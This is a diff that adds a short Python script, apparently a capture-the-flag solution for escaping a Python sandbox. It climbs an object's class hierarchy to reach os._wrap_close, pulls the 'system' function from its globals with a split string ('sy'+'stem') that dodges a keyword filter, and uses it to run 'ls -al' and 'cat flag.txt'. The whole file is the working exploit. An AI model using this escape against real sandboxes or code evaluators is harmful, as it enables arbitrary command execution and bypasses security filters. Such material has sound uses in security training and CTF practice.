@@ -1,0 +1,8 @@
+# <class 'os._wrap_close'>
+print(RMbPOQHCzt.__class__.__mro__[1].__subclasses__()[132])
+
+# system("ls -al")
+print(RMbPOQHCzt.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__["sy"+"stem"]("ls -al"))
+
+# cat flag.txt
+print(RMbPOQHCzt.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__["sy"+"stem"]("cat flag.txt"))
